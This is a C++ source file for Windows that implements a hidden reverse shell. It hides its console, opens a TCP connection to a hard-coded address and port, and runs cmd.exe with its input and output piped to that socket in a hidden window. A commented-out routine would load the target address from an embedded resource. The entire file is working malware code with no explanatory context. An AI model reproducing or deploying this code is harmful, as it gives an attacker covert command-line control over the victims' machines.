#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include "resource.h"
#include <iostream>

using namespace std;
#pragma comment(lib, "Ws2_32.lib")

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT "1234"


//string _getaddr()
//{
//	HRSRC hResource = nullptr;
//	HGLOBAL hMemory = nullptr;
//	void* ptr = nullptr;
//	hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_TEXT1), L"TEXT");
//	hMemory = LoadResource(nullptr, hResource);
//	size_t  size_bytes = SizeofResource(nullptr, hResource);
//	ptr = LockResource(hMemory);
//	string dst = std::string(reinterpret_cast<char*>(ptr), size_bytes);
//	std::cout << dst;
//	return "";
//}


int main(int argc, char *argv[])
{

	//_getaddr();
	FreeConsole();
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
	//system("pause");
	return 0;
}